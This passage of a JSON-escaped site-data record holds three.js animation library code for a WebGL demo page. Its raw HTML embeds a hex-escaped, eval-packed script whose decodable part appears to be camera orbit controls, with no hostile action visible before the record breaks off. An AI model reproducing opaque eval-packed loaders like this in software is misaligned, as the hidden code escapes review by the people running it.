2.0 * cross(q.xyz, cross(q.xyz, v) + q.w * v);\\n}\\n\\nvec4 quatFromAxisAngle(vec3 axis, float angle)\\n{\\n    float halfAngle = angle * 0.5;\\n    return vec4(axis.xyz * sin(halfAngle), cos(halfAngle));\\n}\\n\";\n  THREE.BAS.PrefabBufferGeometry = function(prefab, count) {\n    THREE.BufferGeometry.call(this);\n    this.prefabGeometry = prefab;\n    this.prefabCount = count;\n    this.prefabVertexCount = prefab.vertices.length;\n    this.bufferDefaults()\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype = Object.create(THREE.BufferGeometry.prototype);\n  THREE.BAS.PrefabBufferGeometry.prototype.constructor = THREE.BAS.PrefabBufferGeometry;\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferDefaults = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabIndices = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      prefabIndices.push(face.a, face.b, face.c)\n    }\n    var indexBuffer = new Uint32Array(this.prefabCount * prefabIndexCount);\n    var positionBuffer = new Float32Array(this.prefabCount * prefabVertexCount * 3);\n    this.setIndex(new THREE.BufferAttribute(indexBuffer, 1));\n    this.addAttribute('position', new THREE.BufferAttribute(positionBuffer, 3));\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 3) {\n        var prefabVertex = this.prefabGeometry.vertices[j];\n        positionBuffer[offset] = prefabVertex.x;\n        positionBuffer[offset + 1] = prefabVertex.y;\n        positionBuffer[offset + 2] = prefabVertex.z\n      }\n      for (var k = 0; k < prefabIndexCount; k++) {\n        indexBuffer[i * prefabIndexCount + k] = prefabIndices[k] + i * prefabVertexCount\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferUvs = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabUvs = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      var uv = this.prefabGeometry.faceVertexUvs[0][h];\n      prefabUvs[face.a] = uv[0];\n      prefabUvs[face.b] = uv[1];\n      prefabUvs[face.c] = uv[2]\n    }\n    var uvBuffer = this.createAttribute('uv', 2);\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 2) {\n        var prefabUv = prefabUvs[j];\n        uvBuffer.array[offset] = prefabUv.x;\n        uvBuffer.array[offset + 1] = prefabUv.y\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.computeVertexNormals = function() {\n    var index = this.index;\n    var attributes = this.attributes;\n    var positions = attributes.position.array;\n    if (attributes.normal === undefined) {\n      this.addAttribute('normal', new THREE.BufferAttribute(new Float32Array(positions.length), 3))\n    }\n    var normals = attributes.normal.array;\n    var vA, vB, vC, pA = new THREE.Vector3(),\n      pB = new THREE.Vector3(),\n      pC = new THREE.Vector3(),\n      cb = new THREE.Vector3(),\n      ab = new THREE.Vector3();\n    var indices = index.array;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    for (var i = 0; i < prefabIndexCount; i += 3) {\n      vA = indices[i + 0] * 3;\n      vB = indices[i + 1] * 3;\n      vC = indices[i + 2] * 3;\n      pA.fromArray(positions, vA);\n      pB.fromArray(positions, vB);\n      pC.fromArray(positions, vC);\n      cb.subVectors(pC, pB);\n      ab.subVectors(pA, pB);\n      cb.cross(ab);\n      normals[vA] += cb.x;\n      normals[vA + 1] += cb.y;\n      normals[vA + 2] += cb.z;\n      normals[vB] += cb.x;\n      normals[vB + 1] += cb.y;\n      normals[vB + 2] += cb.z;\n      normals[vC] += cb.x;\n      normals[vC + 1] += cb.y;\n      normals[vC + 2] += cb.z\n    }\n    for (var j = 1; j < this.prefabCount; j++) {\n      for (var k = 0; k < prefabIndexCount; k++) {\n        normals[j * prefabIndexCount + k] = normals[k]\n      }\n    }\n    this.normalizeNormals();\n    attributes.normal.needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.createAttribute = function(name, itemSize) {\n    var buffer = new Float32Array(this.prefabCount * this.prefabVertexCount * itemSize);\n    var attribute = new THREE.BufferAttribute(buffer, itemSize);\n    this.addAttribute(name, attribute);\n    return attribute\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute4 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z;\n        array[offset++] = v.w\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute3 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute2 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < this.prefabCount; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.BaseAnimationMaterial = function(parameters) {\n    THREE.ShaderMaterial.call(this);\n    this.shaderFunctions = [];\n    this.shaderParameters = [];\n    this.shaderVertexInit = [];\n    this.shaderTransformNormal = [];\n    this.shaderTransformPosition = [];\n    this.setValues(parameters)\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype = Object.create(THREE.ShaderMaterial.prototype);\n  THREE.BAS.BaseAnimationMaterial.prototype.constructor = THREE.BAS.BaseAnimationMaterial;\n  THREE.BAS.BaseAnimationMaterial.prototype._0 = function() {\n    return ''\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._1 = function() {\n    return this.shaderFunctions.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._3 = function() {\n    return this.shaderParameters.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._5 = function() {\n    return this.shaderVertexInit.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._4 = function() {\n    return this.shaderTransformNormal.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._2 = function() {\n    return this.shaderTransformPosition.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype.setUniformValues = function(values) {\n    for (var key in values) {\n      if (key in this.uniforms) {\n        var uniform = this.uniforms[key];\n        var value = values[key];\n        switch (uniform.type) {\n          case 'c':\n            uniform.value.set(value);\n            break;\n          case 'v2':\n          case 'v3':\n          case 'v4':\n            uniform.value.copy(value);\n            break;\n          case 'f':\n          case 't':\n            uniform.value = value\n        }\n      }\n    }\n  };\n  THREE.BAS.PhongAnimationMaterial = function(parameters, uniformValues) {\n    THREE.BAS.BaseAnimationMaterial.call(this, parameters);\n    var phongShader = THREE.ShaderLib['phong'];\n    this.uniforms = THREE.UniformsUtils.merge([phongShader.uniforms, this.uniforms]);\n    this.lights = true;\n    this.vertexShader = this._0();\n    this.fragmentShader = phongShader.fragmentShader;\n    uniformValues.map && (this.defines['USE_MAP'] = '');\n    uniformValues.normalMap && (this.defines['USE_NORMALMAP'] = '');\n    this.setUniformValues(uniformValues)\n  };\n  THREE.BAS.PhongAnimationMaterial.prototype = Object.create(THREE.BAS.BaseAnimationMaterial.prototype);\n  THREE.BAS.PhongAnimationMaterial.prototype.constructor = THREE.BAS.PhongAnimationMaterial;\n  THREE.BAS.PhongAnimationMaterial.prototype._0 = function() {\n    return [\"#define PHONG\", \"varying vec3 vViewPosition;\", \"#ifndef FLAT_SHADED\", \" varying vec3 vNormal;\", \"#endif\", THREE.ShaderChunk[\"common\"], THREE.ShaderChunk[\"uv_pars_vertex\"], THREE.ShaderChunk[\"uv2_pars_vertex\"], THREE.ShaderChunk[\"displacementmap_pars_vertex\"], THREE.ShaderChunk[\"envmap_pars_vertex\"], THREE.ShaderChunk[\"lights_phong_pars_vertex\"], THREE.ShaderChunk[\"color_pars_vertex\"], THREE.ShaderChunk[\"morphtarget_pars_vertex\"], THREE.ShaderChunk[\"skinning_pars_vertex\"], THREE.ShaderChunk[\"shadowmap_pars_vertex\"], THREE.ShaderChunk[\"logdepthbuf_pars_vertex\"], this._1(), this._3(), \"void main() {\", this._5(), THREE.ShaderChunk[\"uv_vertex\"], THREE.ShaderChunk[\"uv2_vertex\"], THREE.ShaderChunk[\"color_vertex\"], THREE.ShaderChunk[\"beginnormal_vertex\"], this._4(), THREE.ShaderChunk[\"morphnormal_vertex\"], THREE.ShaderChunk[\"skinbase_vertex\"], THREE.ShaderChunk[\"skinnormal_vertex\"], THREE.ShaderChunk[\"defaultnormal_vertex\"], \"#ifndef FLAT_SHADED\", \"  vNormal = normalize( transformedNormal );\", \"#endif\", THREE.ShaderChunk[\"begin_vertex\"], this._2(), THREE.ShaderChunk[\"displacementmap_vertex\"], THREE.ShaderChunk[\"morphtarget_vertex\"], THREE.ShaderChunk[\"skinning_vertex\"], THREE.ShaderChunk[\"project_vertex\"], THREE.ShaderChunk[\"logdepthbuf_vertex\"], \"  vViewPosition = - mvPosition.xyz;\", THREE.ShaderChunk[\"worldpos_vertex\"], THREE.ShaderChunk[\"envmap_vertex\"], THREE.ShaderChunk[\"lights_phong_vertex\"], THREE.ShaderChunk[\"shadowmap_vertex\"], \"}\"].join(\"\\n\")\n  };\n  </script>\n</body>\n\n</html>\n","source":"libs/webGL/a10/a10.html","raw":"layout: false\n---\n<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a10</title>\n  <script src=\"three.min.js\"></script>\n  <script>\n  window[\"\\x65\\x76\\x61\\x6c\"](function(zpe1, KMbIQKO2, zaqKDBSC3, o_bFE4, _5, kqAZgqEsm6) {\n    _5 = function(zaqKDBSC3) {\n      return (zaqKDBSC3 < KMbIQKO2 ? \"\" : _5(window[\"\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\"](zaqKDBSC3 / KMbIQKO2))) + ((zaqKDBSC3 = zaqKDBSC3 % KMbIQKO2) > 35 ? window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"][\"\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\"](zaqKDBSC3 + 29) : zaqKDBSC3[\"\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\"](36))\n    };\n    if (!'' [\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](/^/, window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"])) {\n      while (zaqKDBSC3--) kqAZgqEsm6[_5(zaqKDBSC3)] = o_bFE4[zaqKDBSC3] || _5(zaqKDBSC3);\n      o_bFE4 = [function(_5) {\n        return kqAZgqEsm6[_5]\n      }];\n      _5 = function() {\n        return '\\\\\\x77\\x2b'\n      };\n      zaqKDBSC3 = 1;\n    };\n    while (zaqKDBSC3--)\n      if (o_bFE4[zaqKDBSC3]) zpe1 = zpe1[\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](new window[\"\\x52\\x65\\x67\\x45\\x78\\x70\"]('\\\\\\x62' + _5(zaqKDBSC3) + '\\\\\\x62', '\\x67'), o_bFE4[zaqKDBSC3]);\n    return zpe1;\n  }('\\x6a\\x2e\\x31\\x49\\x3d\\x68\\x28\\x69\\x2c\\x6b\\x29\\x7b\\x61\\x2e\\x69\\x3d\\x69\\x3b\\x61\\x2e\\x6b\\x3d\\x28\\x6b\\x21\\x3d\\x3d\\x47\\x29\\x3f\\x6b\\x3a\\x4c\\x3b\\x61\\x2e\\x46\\x3d\\x71\\x3b\\x61\\x2e\\x45\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x61\\x2e\\x32\\x59\\x3d\\x61\\x2e\\x45\\x3b\\x61\\x2e\\x31\\x61\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x48\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6d\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x6e\\x3d\\x32\\x53\\x3b\\x61\\x2e\\x31\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x66\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x31\\x34\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x68\\x3d\\x37\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x4a\\x3d\\x32\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x63\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x61\\x3d\\x65\\x2e\\x4e\\x3b\\x61\\x2e\\x32\\x75\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x6a\\x3d\\x7b\\x32\\x76\\x3a\\x33\\x37\\x2c\\x32\\x74\\x3a\\x33\\x38\\x2c\\x32\\x71\\x3a\\x33\\x39\\x2c\\x32\\x77\\x3a\\x33\\x30\\x7d\\x3b\\x63 \\x39\\x3d\\x61\\x3b\\x63 \\x31\\x69\\x3d\\x30\\x2e\\x33\\x62\\x3b\\x63 \\x5a\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x59\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x30\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x55\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x57\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x56\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x54\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x6f\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x52\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x53\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x67\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x79\\x3d\\x30\\x3b\\x63 \\x31\\x6c\\x3d\\x30\\x3b\\x63 \\x31\\x63\\x3d\\x31\\x3b\\x63 \\x73\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x42\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x47\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x3b\\x63 \\x6c\\x3d\\x7b\\x31\\x31\\x3a\\x2d\\x31\\x2c\\x31\\x4e\\x3a\\x30\\x2c\\x31\\x4f\\x3a\\x31\\x2c\\x31\\x4c\\x3a\\x32\\x2c\\x32\\x32\\x3a\\x33\\x2c\\x31\\x50\\x3a\\x34\\x2c\\x31\\x54\\x3a\\x35\\x7d\\x3b\\x63 \\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x3b\\x61\\x2e\\x32\\x4b\\x3d\\x61\\x2e\\x45\\x2e\\x31\\x73\\x28\\x29\\x3b\\x61\\x2e\\x32\\x4c\\x3d\\x61\\x2e\\x69\\x2e\\x77\\x2e\\x31\\x73\\x28\\x29\\x3b\\x63 \\x31\\x57\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x2e\\x33\\x64\\x28\\x69\\x2e\\x32\\x58\\x2c\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x30\\x2c\\x31\\x2c\\x30\\x29\\x29\\x3b\\x63 \\x32\\x64\\x3d\\x31\\x57\\x2e\\x31\\x73\\x28\\x29\\x2e\\x33\\x35\\x28\\x29\\x3b\\x63 \\x32\\x38\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x33\\'\\x7d\\x3b\\x63 \\x31\\x71\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x31\\'\\x7d\\x3b\\x63 \\x31\\x7a\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x32\\'\\x7d\\x3b\\x61\\x2e\\x31\\x6f\\x3d\\x68\\x28\\x4b\\x29\\x7b\\x64\\x28\\x4b\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4b\\x3d\\x31\\x41\\x28\\x29\\x7d\\x31\\x6c\\x2d\\x3d\\x4b\\x7d\\x3b\\x61\\x2e\\x32\\x30\\x3d\\x68\\x28\\x4b\\x29\\x7b\\x64\\x28\\x4b\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4b\\x3d\\x31\\x41\\x28\\x29\\x7d\\x31\\x79\\x2d\\x3d\\x4b\\x7d\\x3b\\x61\\x2e\\x31\\x4b\\x3d\\x68\\x28\\x4d\\x29\\x7b\\x63 \\x51\\x3d\\x61\\x2e\\x69\\x2e\\x32\\x69\\x2e\\x32\\x39\\x3b\\x54\\x2e\\x72\\x28\\x51\\x5b\\x30\\x5d\\x2c\\x51\\x5b\\x31\\x5d\\x2c\\x51\\x5b\\x32\\x5d\\x29\\x3b\\x54\\x2e\\x32\\x6c\\x28\\x2d\\x4d\\x29\\x3b\\x73\\x2e\\x31\\x6e\\x28\\x54\\x29\\x7d\\x3b\\x61\\x2e\\x31\\x46\\x3d\\x68\\x28\\x4d\\x29\\x7b\\x63 \\x51\\x3d\\x61\\x2e\\x69\\x2e\\x32\\x69\\x2e\\x32\\x39\\x3b\\x54\\x2e\\x72\\x28\\x51\\x5b\\x34\\x5d\\x2c\\x51\\x5b\\x35\\x5d\\x2c\\x51\\x5b\\x36\\x5d\\x29\\x3b\\x54\\x2e\\x32\\x6c\\x28\\x4d\\x29\\x3b\\x73\\x2e\\x31\\x6e\\x28\\x54\\x29\\x7d\\x3b\\x61\\x2e\\x73\\x3d\\x68\\x28\\x31\\x4d\\x2c\\x31\\x53\\x29\\x7b\\x63 \\x41\\x3d\\x39\\x2e\\x6b\\x3d\\x3d\\x3d\\x4c\\x3f\\x39\\x2e\\x6b\\x2e\\x31\\x59\\x3a\\x39\\x2e\\x6b\\x3b\\x64\\x28\\x39\\x2e\\x69\\x2e\\x32\\x6a\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x63 \\x77\\x3d\\x39\\x2e\\x69\\x2e\\x77\\x3b\\x63 \\x6f\\x3d\\x77\\x2e\\x31\\x73\\x28\\x29\\x2e\\x32\\x66\\x28\\x39\\x2e\\x45\\x29\\x3b\\x63 \\x31\\x76\\x3d\\x6f\\x2e\\x31\\x70\\x28\\x29\\x3b\\x31\\x76\\x2a\\x3d\\x65\\x2e\\x32\\x52\\x28\\x28\\x39\\x2e\\x69\\x2e\\x32\\x6a\\x2f \\x32\\x29 \\x2a \\x65\\x2e\\x4e \\x2f\\x32\\x56\\x2e\\x30\\x29\\x3b\\x39\\x2e\\x31\\x4b\\x28\\x32\\x2a\\x31\\x4d\\x2a\\x31\\x76\\x2f\\x41\\x2e\\x31\\x64\\x29\\x3b\\x39\\x2e\\x31\\x46\\x28\\x32\\x2a\\x31\\x53\\x2a\\x31\\x76\\x2f\\x41\\x2e\\x31\\x64\\x29\\x7d\\x76 \\x64\\x28\\x39\\x2e\\x69\\x2e\\x32\\x65\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x39\\x2e\\x31\\x4b\\x28\\x31\\x4d\\x2a\\x28\\x39\\x2e\\x69\\x2e\\x32\\x57\\x2d\\x39\\x2e\\x69\\x2e\\x33\\x66\\x29\\x2f\\x41\\x2e\\x32\\x35\\x29\\x3b\\x39\\x2e\\x31\\x46\\x28\\x31\\x53\\x2a\\x28\\x39\\x2e\\x69\\x2e\\x32\\x65\\x2d\\x39\\x2e\\x69\\x2e\\x33\\x71\\x29\\x2f\\x41\\x2e\\x31\\x64\\x29\\x7d\\x76\\x7b\\x33\\x70\\x2e\\x33\\x75\\x28\\'\\x33\\x73\\x3a \\x31\\x49\\x2e\\x33\\x74 \\x33\\x72 \\x33\\x77 \\x33\\x76 \\x33\\x69 \\x31\\x6d \\x2d \\x73 \\x33\\x6a\\x2e\\'\\x29\\x7d\\x7d\\x3b\\x61\\x2e\\x31\\x78\\x3d\\x68\\x28\\x4a\\x29\\x7b\\x64\\x28\\x4a\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4a\\x3d\\x31\\x43\\x28\\x29\\x7d\\x31\\x63\\x2f\\x3d\\x4a\\x7d\\x3b\\x61\\x2e\\x31\\x77\\x3d\\x68\\x28\\x4a\\x29\\x7b\\x64\\x28\\x4a\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4a\\x3d\\x31\\x43\\x28\\x29\\x7d\\x31\\x63\\x2a\\x3d\\x4a\\x7d\\x3b\\x61\\x2e\\x75\\x3d\\x68\\x28\\x29\\x7b\\x63 \\x77\\x3d\\x61\\x2e\\x69\\x2e\\x77\\x3b\\x6f\\x2e\\x74\\x28\\x77\\x29\\x2e\\x32\\x66\\x28\\x61\\x2e\\x45\\x29\\x3b\\x6f\\x2e\\x32\\x68\\x28\\x31\\x57\\x29\\x3b\\x63 \\x31\\x74\\x3d\\x65\\x2e\\x32\\x6f\\x28\\x6f\\x2e\\x78\\x2c\\x6f\\x2e\\x7a\\x29\\x3b\\x63 \\x48\\x3d\\x65\\x2e\\x32\\x6f\\x28\\x65\\x2e\\x32\\x36\\x28\\x6f\\x2e\\x78\\x2a\\x6f\\x2e\\x78\\x2b\\x6f\\x2e\\x7a\\x2a\\x6f\\x2e\\x7a\\x29\\x2c\\x6f\\x2e\\x79\\x29\\x3b\\x64\\x28\\x61\\x2e\\x32\\x6b\\x29\\x7b\\x61\\x2e\\x31\\x6f\\x28\\x31\\x41\\x28\\x29\\x29\\x7d\\x31\\x74\\x2b\\x3d\\x31\\x6c\\x3b\\x48\\x2b\\x3d\\x31\\x79\\x3b\\x48\\x3d\\x65\\x2e\\x31\\x56\\x28\\x61\\x2e\\x32\\x63\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x61\\x2e\\x32\\x61\\x2c\\x48\\x29\\x29\\x3b\\x48\\x3d\\x65\\x2e\\x31\\x56\\x28\\x31\\x69\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x65\\x2e\\x4e\\x2d\\x31\\x69\\x2c\\x48\\x29\\x29\\x3b\\x63 \\x31\\x38\\x3d\\x6f\\x2e\\x31\\x70\\x28\\x29\\x2a\\x31\\x63\\x3b\\x31\\x38\\x3d\\x65\\x2e\\x31\\x56\\x28\\x61\\x2e\\x32\\x6d\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x61\\x2e\\x32\\x6e\\x2c\\x31\\x38\\x29\\x29\\x3b\\x61\\x2e\\x45\\x2e\\x31\\x6e\\x28\\x73\\x29\\x3b\\x6f\\x2e\\x78\\x3d\\x31\\x38\\x2a\\x65\\x2e\\x31\\x48\\x28\\x48\\x29\\x2a\\x65\\x2e\\x31\\x48\\x28\\x31\\x74\\x29\\x3b\\x6f\\x2e\\x79\\x3d\\x31\\x38\\x2a\\x65\\x2e\\x32\\x67\\x28\\x48\\x29\\x3b\\x6f\\x2e\\x7a\\x3d\\x31\\x38\\x2a\\x65\\x2e\\x31\\x48\\x28\\x48\\x29\\x2a\\x65\\x2e\\x32\\x67\\x28\\x31\\x74\\x29\\x3b\\x6f\\x2e\\x32\\x68\\x28\\x32\\x64\\x29\\x3b\\x77\\x2e\\x74\\x28\\x61\\x2e\\x45\\x29\\x2e\\x31\\x6e\\x28\\x6f\\x29\\x3b\\x61\\x2e\\x69\\x2e\\x33\\x6b\\x28\\x61\\x2e\\x45\\x29\\x3b\\x31\\x6c\\x3d\\x30\\x3b\\x31\\x79\\x3d\\x30\\x3b\\x31\\x63\\x3d\\x31\\x3b\\x73\\x2e\\x72\\x28\\x30\\x2c\\x30\\x2c\\x30\\x29\\x3b\\x64\\x28\\x31\\x42\\x2e\\x33\\x6e\\x28\\x61\\x2e\\x69\\x2e\\x77\\x29\\x3e\\x31\\x69\\x7c\\x7c\\x38\\x2a\\x28\\x31\\x2d\\x31\\x47\\x2e\\x33\\x6f\\x28\\x61\\x2e\\x69\\x2e\\x32\\x37\\x29\\x29\\x3e\\x31\\x69\\x29\\x7b\\x61\\x2e\\x58\\x28\\x32\\x38\\x29\\x3b\\x31\\x42\\x2e\\x74\\x28\\x61\\x2e\\x69\\x2e\\x77\\x29\\x3b\\x31\\x47\\x2e\\x74\\x28\\x61\\x2e\\x69\\x2e\\x32\\x37\\x29\\x7d\\x7d\\x3b\\x61\\x2e\\x33\\x67\\x3d\\x68\\x28\\x29\\x7b\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x3b\\x61\\x2e\\x45\\x2e\\x74\\x28\\x61\\x2e\\x32\\x4b\\x29\\x3b\\x61\\x2e\\x69\\x2e\\x77\\x2e\\x74\\x28\\x61\\x2e\\x32\\x4c\\x29\\x3b\\x61\\x2e\\x75\\x28\\x29\\x7d\\x3b\\x68 \\x31\\x41\\x28\\x29\\x7b\\x67 \\x32\\x2a\\x65\\x2e\\x4e\\x2f \\x32\\x4d \\x2f\\x32\\x4d\\x2a\\x39\\x2e\\x32\\x4a\\x7d\\x68 \\x31\\x43\\x28\\x29\\x7b\\x67 \\x65\\x2e\\x33\\x6d\\x28\\x30\\x2e\\x33\\x6c\\x2c\\x39\\x2e\\x32\\x48\\x29\\x7d\\x68 \\x32\\x43\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x64\\x28\\x62\\x2e\\x31\\x44\\x3d\\x3d\\x3d\\x30\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x4e\\x3b\\x5a\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x7d\\x76 \\x64\\x28\\x62\\x2e\\x31\\x44\\x3d\\x3d\\x3d\\x31\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x4f\\x3b\\x52\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x7d\\x76 \\x64\\x28\\x62\\x2e\\x31\\x44\\x3d\\x3d\\x3d\\x32\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x4c\\x3b\\x55\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x7d\\x4c\\x2e\\x42\\x28\\'\\x32\\x49\\'\\x2c\\x31\\x45\\x2c\\x66\\x29\\x3b\\x4c\\x2e\\x42\\x28\\'\\x32\\x50\\'\\x2c\\x31\\x4a\\x2c\\x66\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x71\\x29\\x7d\\x68 \\x31\\x45\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x63 \\x41\\x3d\\x39\\x2e\\x6b\\x3d\\x3d\\x3d\\x4c\\x3f\\x39\\x2e\\x6b\\x2e\\x31\\x59\\x3a\\x39\\x2e\\x6b\\x3b\\x64\\x28\\x6e\\x3d\\x3d\\x3d\\x6c\\x2e\\x31\\x4e\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x59\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x3b\\x31\\x30\\x2e\\x31\\x62\\x28\\x59\\x2c\\x5a\\x29\\x3b\\x39\\x2e\\x31\\x6f\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x78\\x2f\\x41\\x2e\\x32\\x35\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x39\\x2e\\x32\\x30\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x79\\x2f\\x41\\x2e\\x31\\x64\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x5a\\x2e\\x74\\x28\\x59\\x29\\x7d\\x76 